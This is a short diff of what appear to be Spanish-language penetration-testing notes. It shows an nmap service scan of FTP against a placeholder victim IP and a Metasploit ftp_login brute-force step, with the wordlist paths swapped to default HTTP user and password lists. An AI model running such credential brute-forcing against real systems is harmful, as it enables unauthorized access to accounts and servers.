@@ -358,8 +358,9 @@ nmap -sV -p 21 <IP_VICTIMA>
 # 2. Fuerza bruta FTP
 msfconsole
 use auxiliary/scanner/ftp/ftp_login
-set USER_FILE /usr/share/wordlists/metasploit/usr.txt
-set PASS_FILE /usr/share/wordlists/metasploit/pass.txt
+set USER_FILE /usr/share/wordlists/metasploit/http_default_users.txt
+set PASS_FILE /usr/share/wordlists/metasploit/http_default_pass.txt
+
 
 exploit
 
